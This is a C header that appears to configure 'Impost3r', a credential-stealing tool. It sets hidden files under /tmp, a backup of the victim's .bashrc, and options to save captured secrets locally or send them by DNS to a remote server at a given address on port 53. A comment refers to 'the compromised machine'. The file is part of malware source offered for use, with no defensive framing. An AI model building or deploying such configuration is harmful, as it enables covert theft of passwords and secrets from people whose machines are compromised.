/* 
    Don't edit 
*/
# define BUFFER_LEN 4096
# define MAX_RETRY 3

/*
    Custom setting
*/
# define FILENAME "/tmp/.impost3r"
# define BACKUP_ORI_FILENAME ".bashrc"
# define BACKUP_ORI_PATH "/tmp/.bashrc"
# define SAVE_OR_SEND 0 //send=0,save=1,default is send
/*
    Send to server
*/
# define YOUR_DOMAIN ".com" //Default is directly send to the dns server under you control,if you want to use the compromised machine's default dns to send the secret out,change ".com" to your domain, like "example.com"
# define MAX_RESEND 30
# define RESEND_INTERVAL 5
# define REMOTE_ADDRESS "192.168.0.12"
# define REMOTE_PORT 53

/*
    Save to local
*/
# define SAVE_LOCATION "/tmp/.cache"